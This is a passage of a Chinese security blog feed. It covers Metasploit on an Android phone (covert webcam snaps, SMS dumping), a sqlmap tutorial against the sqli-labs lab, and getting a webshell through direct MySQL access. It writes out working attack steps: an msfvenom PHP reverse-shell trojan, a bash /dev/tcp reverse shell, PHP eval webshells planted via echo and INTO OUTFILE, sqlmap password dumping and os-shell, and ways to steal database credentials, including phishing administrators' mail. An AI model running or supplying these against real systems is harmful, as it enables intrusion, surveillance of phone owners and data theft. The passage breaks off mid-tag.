id="打开手机摄像头："><a href="#打开手机摄像头：" class="headerlink" title="打开手机摄像头："></a>打开手机摄像头：</h4><pre><code>meterpreter &gt; webcam_stream[*] Starting...[*] Preparing player...[*] Opening player at: /root/ohFWZoub.html[*] Streaming...[-] webcam_start: Operation failed: 1meterpreter &gt; Sandbox: unsupported fd-relative fstatat(31, &quot;&quot;, 0x7FFE461BC470, 4096)Sandbox: seccomp sandbox violation: pid 3679, tid 3679, syscall 262, args 31 139979469005566 140730074645616 4096 4096 1.Sandbox: unsupported fd-relative fstatat(31, &quot;&quot;, 0x7FFE461BC370, 4096)Sandbox: seccomp sandbox violation: pid 3679, tid 3679, syscall 262, args 31 139979469005566 140730074645360 4096 4096 1.Sandbox: unsupported fd-relative fstatat(31, &quot;&quot;, 0x7FFE461BC370, 4096)Sandbox: seccomp sandbox violation: pid 3679, tid 3679, syscall 262, args 31 139979469005566 140730074645360 4096 4096 1.Sandbox: unsupported fd-relative fstatat(33, &quot;&quot;, 0x7FFCFB734980, 4096)Sandbox: seccomp sandbox violation: pid 3731, tid 3731, syscall 262, args 33 139698781278974 140724527122816 4096 4096 1.Sandbox: unsupported fd-relative fstatat(33, &quot;&quot;, 0x7FFCFB734880, 4096)Sandbox: seccomp sandbox violation: pid 3731, tid 3731, syscall 262, args 33 139698781278974 140724527122560 4096 4096 1.Sandbox: unsupported fd-relative fstatat(33, &quot;&quot;, 0x7FFCFB734880, 4096)Sandbox: seccomp sandbox violation: pid 3731, tid 3731, syscall 262, args 33 139698781278974 140724527122560 4096 4096 1.Sandbox: unsupported fd-relative fstatat(26, &quot;&quot;, 0x7FFFD2AA0540, 4096)Sandbox: seccomp sandbox violation: pid 3768, tid 3768, syscall 262, args 26 140163614188286 140736727745856 4096 4096 1.Sandbox: unsupported fd-relative fstatat(26, &quot;&quot;, 0x7FFFD2AA0440, 4096)Sandbox: seccomp sandbox violation: pid 3768, tid 3768, syscall 262, args 26 140163614188286 140736727745600 4096 4096 1.Sandbox: unsupported fd-relative fstatat(26, &quot;&quot;, 0x7FFFD2AA0440, 4096)Sandbox: seccomp sandbox violation: pid 3768, tid 3768, syscall 262, args 26 140163614188286 140736727745600 4096 4096 1.12345678910111213141516171819202122232425</code></pre><p><img src="/../pic/Msfvenom%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%88%A9%E7%94%A8.assets/3.png" alt="在这里插入图片描述"></p><p>这里报很多错，不明所以，可能是因为mi8安全性太高了无法调用摄像头吧（雷军记得打钱</p><h4 id="隐秘拍照（这里mi8会有询问是否调用摄像头，这里实验点击是就行了）："><a href="#隐秘拍照（这里mi8会有询问是否调用摄像头，这里实验点击是就行了）：" class="headerlink" title="隐秘拍照（这里mi8会有询问是否调用摄像头，这里实验点击是就行了）："></a>隐秘拍照（这里mi8会有询问是否调用摄像头，这里实验点击是就行了）：</h4><pre><code>meterpreter &gt; webcam_snap[*] Starting...[+] Got frame[*] StoppedWebcam shot saved to: /root/KzQqTroL.jpeg12345</code></pre><p><img src="/../pic/Msfvenom%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%88%A9%E7%94%A8.assets/4.png" alt="在这里插入图片描述"></p><p>不得不说小米对于安全的把控还是可以的</p><h4 id="导出电话号码与短信："><a href="#导出电话号码与短信：" class="headerlink" title="导出电话号码与短信："></a>导出电话号码与短信：</h4><pre><code>meterpreter &gt; dump_contacts[*] No contacts were found!meterpreter &gt; dump_sms[*] Fetching 243 sms messages[*] SMS messages saved to: sms_dump_20201001145514.txt12345</code></pre><p>这里不知道为啥电话簿没有导出来，不过短信导出来了，不过这里也需要授权</p><p><img src="/../pic/Msfvenom%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%88%A9%E7%94%A8.assets/5.png" alt="在这里插入图片描述"></p><h3 id="PHP："><a href="#PHP：" class="headerlink" title="PHP："></a>PHP：</h3><p>CentOS7（靶机）：192.168.1.103</p><p> ——PHP : 5.4.16</p><p> ——Apache： 2.4.6</p><p>Kali（攻击机）：192.168.1.102</p><p>首先在Kali里面生成基于php脚本语言的木马：</p><pre><code>root@kali:~# msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.102 LPORT=4444 -f raw &gt; shell.php[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload[-] No arch selected, selecting arch: php from the payloadNo encoder specified, outputting raw payloadPayload size: 30689 bytesroot@kali:~# 1234567</code></pre><p>使用msf模块进行端口监听（注意这里要设置与木马payload对应的载荷）：</p><pre><code>msf5 &gt; use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcpmsf5 exploit(multi/handler) &gt; set payload php/meterpreter_reverse_tcppayload =&gt; php/meterpreter_reverse_tcpmsf5 exploit(multi/handler) &gt; set LHOST 192.168.1.102LHOST =&gt; 192.168.1.102msf5 exploit(multi/handler) &gt; run[*] Started reverse TCP handler on 192.168.1.102:4444 123456789</code></pre><p>将木马上传到靶机网站站点中并使用浏览器访问该页面：</p><p>访问之前注意要更改木马页面权限<code>chmod 777 shell.php</code></p><p><img src="/../pic/Msfvenom%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%88%A9%E7%94%A8.assets/6.png" alt="image-20201001152201235"></p><p>我们回到kali发现已经得到靶机meterpreter的shell了：</p><pre><code>msf5 exploit(multi/handler) &gt; run[*] Started reverse TCP handler on 192.168.1.102:4444 [*] Meterpreter session 1 opened (192.168.1.102:4444 -&gt; 192.168.1.103:40810) at 2020-10-01 15:20:21 +0800meterpreter &gt; getuidServer username: root (0)1234567</code></pre>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap详细使用教程</title>
      <link href="/2023/03/26/sqlmap/"/>
      <url>/2023/03/26/sqlmap/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlmap详细使用教程"><a href="#sqlmap详细使用教程" class="headerlink" title="sqlmap详细使用教程"></a>sqlmap详细使用教程</h1><h3 id="sqlmap简介"><a href="#sqlmap简介" class="headerlink" title="sqlmap简介"></a>sqlmap简介</h3><p>sqlmap是一款基于python编写的渗透测试工具，在sql检测和利用方面功能强大，支持多种数据库。</p><h3 id="sqlmap常用命令"><a href="#sqlmap常用命令" class="headerlink" title="sqlmap常用命令"></a>sqlmap常用命令</h3><table><thead><tr><th>选项</th><th>描述</th></tr></thead><tbody><tr><td>-h</td><td>显示基本帮助信息</td></tr><tr><td>-hh</td><td>显示高级帮助信息</td></tr><tr><td>–version</td><td>显示版本号</td></tr><tr><td>-v</td><td>详细等级（0-6 默认 1）</td></tr><tr><td></td><td>0：只显示python错误以及重要信息</td></tr><tr><td></td><td>1：显示信息以及警告</td></tr><tr><td></td><td>2：显示debug消息</td></tr><tr><td></td><td>3：显示注入payload</td></tr><tr><td></td><td>4：显示http请求</td></tr><tr><td></td><td>5：显示http响应头</td></tr><tr><td></td><td>6：显示http响应内容</td></tr><tr><td><strong>目标</strong></td><td></td></tr><tr><td>-u</td><td>指定目标url</td></tr><tr><td>-d</td><td>直接连接数据库</td></tr><tr><td>-l</td><td>从burp代理日志的解析目标</td></tr><tr><td>-r</td><td>从文件中加载http请求</td></tr><tr><td>-g</td><td>从google dork的结果作为目标url</td></tr><tr><td>-c</td><td>从INI配置文件中加载选项</td></tr><tr><td><strong>Request</strong></td><td></td></tr><tr><td>-A</td><td>指定user-agent头</td></tr><tr><td>-H</td><td>额外的header</td></tr><tr><td>-method&#x3D;</td><td>指定HTTP方法（GET&#x2F;POST）</td></tr><tr><td>–data&#x3D;</td><td>通过POST提交数据</td></tr><tr><td>–param-del&#x3D;</td><td>指定参数分隔符</td></tr><tr><td>–cookie&#x3D;</td><td>指定cookie的值</td></tr><tr><td>–cookie-del&#x3D;</td><td>指定cookie分隔符</td></tr><tr><td>–drop-set-cookie</td><td>扔掉response中的set-cookie头</td></tr><tr><td>–random-agent</td><td>使用随机的user-agent头</td></tr><tr><td>–host&#x3D;</td><td>设置host头</td></tr><tr><td>–referer&#x3D;</td><td>指定referer头</td></tr><tr><td>–headers&#x3D;</td><td>额外的headers</td></tr><tr><td>–auth-type&#x3D;</td><td>http认证类型（Basic，NTLM，Digest）</td></tr><tr><td>–auith-cred&#x3D;</td><td>http认证凭证（账号：密码）</td></tr><tr><td>–ignore-proxy</td><td>忽略系统代理（常用于扫描本地文件）</td></tr><tr><td>–proxy&#x3D;</td><td>使用代理</td></tr><tr><td>–proxy-cred&#x3D;</td><td>代理认证证书（账号：密码）</td></tr><tr><td>–delay&#x3D;</td><td>设置延迟时间（两个请求之间）</td></tr><tr><td>–timeout&#x3D;</td><td>超时时来连接前等待（默认 30）</td></tr><tr><td>–retries&#x3D;</td><td>连接超时时重试次数（默认 3）</td></tr><tr><td>–randomize&#x3D;</td><td>随机更改指定的参数的值</td></tr><tr><td>–safe-url&#x3D;</td><td>在测试期间经常访问的URL</td></tr><tr><td>–safe-post&#x3D;</td><td>POST数据发送到安全的URL</td></tr><tr><td>–safe-freq&#x3D;</td><td>两次请求之间穿插一个安全的URL</td></tr><tr><td>–skip-urlencode</td><td>跳过payload数据的URL编码</td></tr><tr><td>–chunked</td><td>使用HTTP分块传输加密POST请求</td></tr><tr><td>–hpp</td><td>使用HTTP参数pollution方法（常用于绕过IPS&#x2F;IDS检测）</td></tr><tr><td>–force-ssl</td><td>强制使用SSL&#x2F;HTTPS</td></tr><tr><td>–eval&#x3D;value</td><td>请求之前提供Python代码（eg：”import hashlib;id2&#x3D;hashlib.md5(id).hexdigest()”）</td></tr><tr><td><strong>Optimization</strong></td><td></td></tr><tr><td>-o</td><td>打开所有优化开关</td></tr><tr><td>–predict-output</td><td>预测输出（与–threads不兼容）</td></tr><tr><td>–keep-alive</td><td>建立长久的HTTP(S)连接 (与–proxy不兼容)</td></tr><tr><td>–null-connection</td><td>空连接</td></tr><tr><td>–threads&#x3D;value</td><td>设置线程(默认 1)</td></tr><tr><td><strong>Injection</strong></td><td></td></tr><tr><td>-p</td><td>指定测试参数</td></tr><tr><td>–skip&#x3D;</td><td>跳过指定参数的测试</td></tr><tr><td>–skip-static</td><td>跳过测试静态的参数</td></tr><tr><td>–dbms&#x3D;</td><td>指定具体DBMS</td></tr><tr><td>–os&#x3D;</td><td>指定DBMS操作系统</td></tr><tr><td>–invalid-bignum</td><td>使用大数字使值无效</td></tr><tr><td>–invalid-logical</td><td>使用逻辑符使值无效</td></tr><tr><td>–invalid-string</td><td>使用字符串使值无效</td></tr><tr><td>–no-cast</td><td>关闭payload铸造机制</td></tr><tr><td>–no-escape</td><td>关闭字符转义机制（默认自动开启）</td></tr><tr><td>–prefix&#x3D;</td><td>加入payload前缀</td></tr><tr><td>–suffix&#x3D;</td><td>加入payload后缀</td></tr><tr><td>–tamper&#x3D;</td><td>指定使用的脚本</td></tr><tr><td><strong>Detection</strong></td><td></td></tr><tr><td>–level&#x3D;</td><td>指定测试的等级（1-5 默认为1）</td></tr><tr><td>–risk&#x3D;</td><td>指定测试的风险（0-3 默认为1）</td></tr><tr><td>–string&#x3D;</td><td>登录成功时，页面所含有的“关键字” 用于证明已经登录成功</td></tr><tr><td>–not-string&#x3D;</td><td>登录成功时，页面所含有的“关键字” 用于证明已经登录失败</td></tr><tr><td>–code&#x3D;</td><td>查询为真时，匹配的HTTP代码</td></tr><tr><td>–smart</td><td>当有大量检测目标时，只选择基于错误的检测结果</td></tr><tr><td>–text-only</td><td>仅基于文本内容比较网页</td></tr><tr><td>–titles</td><td>仅基于标题比较网页</td></tr><tr><td><strong>Techniques</strong></td><td></td></tr><tr><td>–technique&#x3D;</td><td>指定sql注入技术（默认BEUSTQ）</td></tr><tr><td>–time-sec&#x3D;</td><td>基于时间注入检测相应的延迟时间（默认为5秒）</td></tr><tr><td>–union-clos&#x3D;</td><td>进行查询时，指定列的范围</td></tr><tr><td>–union-char&#x3D;</td><td>指定暴力破解列数的字符</td></tr><tr><td><strong>Fingerprint</strong></td><td></td></tr><tr><td>-f</td><td>查询目标DBMS版本指纹信息</td></tr><tr><td><strong>Emuneration</strong></td><td></td></tr><tr><td>-a</td><td>查询所有</td></tr><tr><td>-b</td><td>查询目标DBMS banner信息</td></tr><tr><td>–current-user</td><td>查询目标DBMS当前用户</td></tr><tr><td>–current-db</td><td>查询目标DBMS当前数据库</td></tr><tr><td>–is-dba</td><td>查询目标DBMS当前用户是否为DBA</td></tr><tr><td>–users</td><td>枚举目标DBMS所有的用户</td></tr><tr><td>–paswords</td><td>枚举目标DBMS用户密码哈希值</td></tr><tr><td>–privileges</td><td>枚举目标DBMS用户的权限</td></tr><tr><td>–roles</td><td>枚举DBMS用户的角色</td></tr><tr><td>–dbs</td><td>枚举DBMS所有的数据库</td></tr><tr><td>–tables</td><td>枚举DBMS数据库中所有的表</td></tr><tr><td>–columns</td><td>枚举DBMS数据库表中所有的列</td></tr><tr><td>–count</td><td>检索表的条目的数量</td></tr><tr><td>–dump</td><td>存储DBMS数据库的表中的条目</td></tr><tr><td>–dump-all</td><td>存储DBMS所有数据库表中的条目</td></tr><tr><td>–D db</td><td>指定进行枚举的数据库名称</td></tr><tr><td>–T  table</td><td>指定进行枚举的数据库表名称</td></tr><tr><td>–C  column</td><td>指定进行枚举的数据库列名称</td></tr><tr><td>–exclude-sysdbs</td><td>枚举表时排除系统数据库</td></tr><tr><td>–sql-query</td><td>指定查询的sql语句</td></tr><tr><td>–sql-shell</td><td>提示输入一个交互式sql shell</td></tr><tr><td><strong>Brute force</strong></td><td></td></tr><tr><td>–common-tables</td><td>暴力破解表</td></tr><tr><td>–common-colomns</td><td>暴力破解列</td></tr><tr><td><strong>File system access</strong></td><td></td></tr><tr><td>–file-read</td><td>从目标数据库管理文件系统读取文件</td></tr><tr><td>–file-write</td><td>上传文件到目标数据库管理文件系统</td></tr><tr><td>–file-dest</td><td>指定写入文件的绝对路径</td></tr><tr><td>–os-cmd&#x3D;</td><td>执行操作系统命令</td></tr><tr><td>–os-shell</td><td>交互式的系统shell</td></tr><tr><td>–os-pwn</td><td>获取一个OOB shell，Meterpreter或者VNC</td></tr><tr><td>–os-smbrelay</td><td>一键 获取一个OOB shell，Meterpreter或者VNC</td></tr><tr><td>–os-bof</td><td>储存过程缓冲区溢出利用</td></tr><tr><td>–os-esc</td><td>数据库进程用户权限提升</td></tr><tr><td>–msf-path&#x3D;</td><td>Metasploit Framework本地安装路径</td></tr><tr><td><strong>General</strong></td><td></td></tr><tr><td>-s</td><td>sqlite会话文件保存位置</td></tr><tr><td>-t</td><td>记录所有HTTP流量到指定文件中</td></tr><tr><td>–batch</td><td>测试过程中，执行所有默认配置</td></tr><tr><td>–charset&#x3D;v</td><td>强制用于数据检索的字符编码</td></tr><tr><td>–crawl&#x3D;</td><td>从目标URL开始爬取网站</td></tr><tr><td>–crawl-exclude&#x3D;</td><td>禁止爬取某个页面（eg：logout）</td></tr><tr><td>–csv-del&#x3D;</td><td>指定CSV输出中使用的的字符</td></tr><tr><td>–dump-format&#x3D;</td><td>储存数据的方式（CSV(default)，HTML，SQLITE）</td></tr><tr><td>–flush-session</td><td>刷新当前目标的会话文件</td></tr><tr><td>–fresh-queries</td><td>忽略会话文件中储存的查询结果，重新查询</td></tr><tr><td>–hex</td><td>使用DBMS hex函数进行数据检索</td></tr><tr><td>–outpout-dir&#x3D;</td><td>自定义输出目录</td></tr><tr><td>–save&#x3D;</td><td>保存选项到INI配置文件中</td></tr><tr><td>–scope&#x3D;</td><td>使用正则表达式从提供的日志中guo’l</td></tr><tr><td>–alert</td><td>再找到SQL注入时运行主机操作系统命令</td></tr><tr><td>–purge-output</td><td>安全的从输出目录中删除所有内容</td></tr><tr><td>–sqlmap-shell</td><td>提示输入交互式sqlmap shell</td></tr><tr><td>–update</td><td>更新sqlmap</td></tr></tbody></table><h3 id="sqlmap注入技术简介"><a href="#sqlmap注入技术简介" class="headerlink" title="sqlmap注入技术简介"></a>sqlmap注入技术简介</h3><p>–technique&#x3D;   （默认全部使用）</p><p>B    基于布尔的盲注</p><p>T    基于时间的盲注</p><p>E    基于报错的注入</p><p>U    基于UNION查询注入</p><p>S    基于多语句查询注入</p><h3 id="sqlmap获取目标方式"><a href="#sqlmap获取目标方式" class="headerlink" title="sqlmap获取目标方式"></a>sqlmap获取目标方式</h3><p><strong>1.指定目标url</strong></p><p>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1”</p><p><strong>2.从文件中获取多个url</strong></p><p>sqlmap -m 1.txt</p><p><strong>3.从文件中加载HTTP请求</strong></p><p>sqlmap -r url.txt</p><p><strong>4.利用google获取目标</strong></p><p>sqlmap -g “inurl:&quot;.php?id&#x3D;1&quot;“</p><p><strong>5.从burp日志中获取目标</strong></p><p>sqlmap -l   burp.txt</p><h3 id="实例演示-sqlmap注入检测"><a href="#实例演示-sqlmap注入检测" class="headerlink" title="实例演示-sqlmap注入检测"></a>实例演示-sqlmap注入检测</h3><p><strong>1.GET参数注入</strong></p><p>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1”</p><p><strong>2.POST参数注入</strong></p><p>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1” –data&#x3D;”id&#x3D;1”</p><p><strong>3.cookie注入 （level&gt;&#x3D;2时才会检测cookie）</strong>  </p><p>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1” –level 2</p><p>如图，用 * 号指定cookie，这样就可以检测cookie。</p><p>sqlmap -r”&#x2F;root&#x2F;1.txt” </p><p><img src="/../pic/sqlmap.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtbGlfbmc=,size_16,color_FFFFFF,t_70.png" alt="img"></p><p><strong>4.user-agent注入</strong></p><p>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1” –level 3</p><p>如图，用 * 号指定user-agent，这样就可以检测user-agent。</p><p><img src="/../pic/sqlmap.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtbGlfbmc=,size_16,color_FFFFFF,t_70-16798383997621.png" alt="img"></p><p>sqlmap -r”&#x2F;root&#x2F;1.txt” </p><p><strong>5.referer注入</strong></p><p>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1” –level 3</p><p>如图，用 * 号指定referer，这样就可以检测referer。</p><p>sqlmap -r”&#x2F;root&#x2F;1.txt” </p><p><strong><img src="/../pic/sqlmap.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtbGlfbmc=,size_16,color_FFFFFF,t_70-16798383997622.png" alt="img"></strong></p><p><strong>6.host注入</strong></p><p>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1” –level 5</p><p>如图，用 * 号指定host，这样就可以检测host。</p><p>sqlmap -r”&#x2F;root&#x2F;1.txt” </p><p><img src="/../pic/sqlmap.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtbGlfbmc=,size_16,color_FFFFFF,t_70-16798383997623.png" alt="img"></p><h3 id="实例演示-获取数据库信息"><a href="#实例演示-获取数据库信息" class="headerlink" title="实例演示-获取数据库信息"></a>实例演示-获取数据库信息</h3><p><strong>1.查看数据库</strong></p><p>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1” –dbs –batch</p><p><img src="/../pic/sqlmap.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtbGlfbmc=,size_16,color_FFFFFF,t_70-16798383997624.png" alt="img"></p><p><strong>2.查看数据库里面的表</strong></p><p>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1” –D security –tables –batch</p><p><img src="/../pic/sqlmap.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtbGlfbmc=,size_16,color_FFFFFF,t_70-16798383997635.png" alt="img"></p><p><strong>3.查看数据库表里面的列</strong></p><p>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1” –D security –T users –columns  –batch</p><p><img src="/../pic/sqlmap.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtbGlfbmc=,size_16,color_FFFFFF,t_70-16798383997636.png" alt="img"></p><p><strong>4.查看数据库列里面的具体的值</strong></p><p>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1” –D security –T users -C password   –dump –batch</p><p><img src="/../pic/sqlmap.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtbGlfbmc=,size_16,color_FFFFFF,t_70-16798383997637.png" alt="img"></p><h3 id="实例演示-暴力破解"><a href="#实例演示-暴力破解" class="headerlink" title="实例演示-暴力破解"></a>实例演示-暴力破解</h3><p><strong>使用条件：</strong></p><p>1.MySQL数据库版本小于5.0，没有information——schema表。</p><p>2.Microssoft Access数据库。</p><p>3.当前用户没有权限读取系统中保存的数据。</p><p>*<strong>暴力破解中破解表名的文件位于common-tables.txt 中，同理破解列名的文件位于common-columns.txt 中</strong></p><p><strong>1.暴力破解表名</strong></p><p>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1” -D security –common-tables –batch</p><p><img src="/../pic/sqlmap.assets/20200511164600263.png" alt="img"></p><p><strong>2.暴力破解列名</strong></p><p>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1” -D security -Tusers –common-columns –batch</p><p><img src="/../pic/sqlmap.assets/20200511164614628.png" alt="img"></p><h3 id="实例演示-读取文件-x2F-上传文件"><a href="#实例演示-读取文件-x2F-上传文件" class="headerlink" title="实例演示-读取文件&#x2F;上传文件"></a>实例演示-读取文件&#x2F;上传文件</h3><p><strong>1.读取文件</strong></p><p>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1”  –file-read “C:&#x2F;post.txt”</p><p><img src="/../pic/sqlmap.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtbGlfbmc=,size_16,color_FFFFFF,t_70-16798383997638.png" alt="img"></p><p><strong>2写入文件</strong></p><p>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1”  –file-write “&#x2F;root&#x2F;1.txt”</p><p> –file-dest “C:&#x2F;phpstudy&#x2F;PHPTutorial&#x2F;www&#x2F;1.txt”</p><p><img src="/../pic/sqlmap.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtbGlfbmc=,size_16,color_FFFFFF,t_70-16798383997639.png" alt="img"></p><h3 id="实例演示-获取shell"><a href="#实例演示-获取shell" class="headerlink" title="实例演示-获取shell"></a>实例演示-获取shell</h3><p>sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1” –os-shell</p><p><strong>到此就完成了sqlmap的介绍，如果想了解更多关于Kali的工具，请关注我！</strong></p><h1 id="使用sqlmap直连数据库获取webshell"><a href="#使用sqlmap直连数据库获取webshell" class="headerlink" title="使用sqlmap直连数据库获取webshell"></a>使用sqlmap直连数据库获取webshell</h1><p>在有些场景下，需要通过mysql直接连接来获取权限，例如通过暴力破解、嗅探等方法获取了账号及口令，服务器有可能未开放web服务。</p><h3 id="0X001-适用场景"><a href="#0X001-适用场景" class="headerlink" title="0X001 适用场景"></a>0X001 适用场景</h3><p>1.获取了Mysql数据库root账号以及密码。</p><p>2.可以访问3306端口以及数据库。</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="0X002-扫描获取root账号的密码"><a href="#0X002-扫描获取root账号的密码" class="headerlink" title="0X002 扫描获取root账号的密码"></a>0X002 扫描获取root账号的密码</h3><p>  通常有下面一些方法来获取root账号的密码</p><p>（1）phpMyAdmin多线程批量破解工具，下载地址：<a href="http://www.test404.com/post-546.html">http://www.test404.com/post-546.html</a></p><p><a href="http://pan.baidu.com/s/1c1LD6co%EF%BC%8C%E9%80%9A%E8%BF%87%E6%94%B6%E9%9B%86phpmyadmin%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E3%80%82">http://pan.baidu.com/s/1c1LD6co，通过收集phpmyadmin地址进行暴力破解。</a></p><p>（2）代码泄露获取数据库账号和密码</p><p>（3）文件包含读取配置文件中的数据库账号和密码</p><p>（4）通过网络嗅探获取</p><p>（5）渗透运维人员的邮箱及个人主机获取</p><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h3 id="0X003-获取shell"><a href="#0X003-获取shell" class="headerlink" title="0X003 获取shell"></a>0X003 获取shell</h3><p>1.通过sqlmap连接mysql获取shell</p><p>（1）直接连接数据库</p><p>sqlmap.py -d “mysql:&#x2F;&#x2F;root:<a href="mailto:&#x31;&#x32;&#x33;&#x34;&#53;&#54;&#64;&#x31;&#x32;&#x37;&#x2e;&#x30;&#46;&#48;&#x2e;&#49;">&#x31;&#x32;&#x33;&#x34;&#53;&#54;&#64;&#x31;&#x32;&#x37;&#x2e;&#x30;&#46;&#48;&#x2e;&#49;</a>:3306&#x2F;mysql”–os-shell</p><p>（2）通过选择32位或者64位操作系统，获取webshell，执行</p><p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.3&#x2F;80800&gt;&amp;1</p><p>（3）反弹到服务器192.168.1.3，在实际中192.168.1.3为外网独立IP。</p><p>（4）通过echo命令生成shell：</p><p>echo “<?php@eval($_POST['chopper']);?>” &gt;&#x2F;data&#x2F;www&#x2F;phpmyadmin&#x2F;1.php</p><p>如果能够通过phpmyadmin管理数据库，则可以修改host为“%”并执行权限更新，下面命令可参考：</p><p>use mysql;</p><p>update userset host &#x3D; ‘%’ where user &#x3D; ‘root’;</p><p>FLUSHPRIVILEGES ;</p><p>注意：如果数据库中有多个host连接，修改时可能会导致数据库连接出问题。</p><p>2.通过msf反弹</p><p>（1）使用msfvenom生成msf反弹的php脚本木马，默认端口为4444：</p><p>msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcpLHOST&#x3D;192.168.1.3 -f raw &gt; test.php</p><p>（2）在独立IP或者反弹服务器上运行msf依次执行以下命令：</p><p>msfconsole</p><p>use exploit&#x2F;multi&#x2F;handler</p><p>set payload php&#x2F;meterpreter&#x2F;reverse_tcp</p><p>set LHOST 192.168.1.3 &#x2F;&#x2F;192.168.1.3为反弹监听服务器IP</p><p>show options</p><p>run 0 或者exploit</p><p>（3）上传并执行php文件</p><p>将test.php上传到192.168.1.2服务器上面，访问后即可获取msf反弹shell</p><p>http:&#x2F;&#x2F; 192.168.1.2:8080&#x2F;test.php</p><p>3.通过phpmyadmin管理界面查询生成webshll</p><p>select ‘<?php @eval($_POST[cmd]);?>’INTOOUTFILE ‘D:&#x2F;work&#x2F;WWW&#x2F;antian365.php’</p><h2 id="-2"><a href="#-2" class="headerlink" title=""></a></h2><h3 id="0X004-一个实例"><a href="#0X004-一个实例" class="headerlink" title="0X004 一个实例"></a>0X004 一个实例</h3><p>1.直接连接mysql数据库</p><p>执行命令：sqlmap.py -d”mysql:&#x2F;&#x2F;root:123456@2**.****.<strong>.</strong>:3306&#x2F;mysql” –os-shell</p><p>如图1所示，需要设置后端数据库的架构，服务器多为64位，可以先选择64位即输入数字2进行测试，如果不是，可以退出后再次运行并选择。</p><p><img src="/../pic/sqlmap.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3doYXRkYXk=,size_16,color_FFFFFF,t_70.jpeg" alt="img"></p><p>图1选择服务器数据库所在架构</p><h3 id="-3"><a href="#-3" class="headerlink" title=""></a></h3><p>2.上次udf文件</p><p>  选择系统架构后，sqlmap会自动上传udf文件到服务器提权位置，如图2所示，会显示一些信息。Sqlmap不管获取的shell是否成功都显示os-shell提示符。</p><p><img src="/../pic/sqlmap.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3doYXRkYXk=,size_16,color_FFFFFF,t_70-16814780790511.jpeg" 